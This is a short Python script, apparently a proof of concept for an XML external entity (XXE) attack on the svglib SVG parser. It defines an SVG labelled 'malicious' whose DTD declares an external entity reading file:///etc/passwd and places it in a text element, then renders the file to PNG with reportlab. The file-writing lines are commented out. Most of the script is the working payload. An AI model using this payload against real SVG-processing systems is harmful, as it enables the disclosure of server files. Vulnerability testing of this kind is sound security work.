import os
from svglib.svglib import svg2rlg
from reportlab.graphics import renderPM

# Create the malicious SVG file
malicious_svg = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>"
<svg width="10cm" height="3cm" viewBox="0 0 1000 300"
     xmlns="http://www.w3.org/2000/svg" version="1.1">
  <desc>Example text01 - 'Hello, out there' in blue</desc>
  <text x="250" y="150" 
        font-family="Verdana" font-size="55" fill="blue">
    &xxe;
  </text>
  <rect x="1" y="1" width="998" height="298"
        fill="none" stroke="blue" stroke-width="2" />
</svg>'''

drawing = svg2rlg("malicious.svg")

print("drawing =", drawing)

if drawing is None:
    print("SVG parsing failed")
    exit(1)

renderPM.drawToFile(drawing, "output.png", fmt="PNG")
print("done")
#with open('malicious.svg', 'w') as f:
    #f.write(malicious_svg)

# Process the SVG
#drawing = svg2rlg('malicious.svg')
#renderPM.drawToFile(drawing, 'output.png', fmt="PNG")
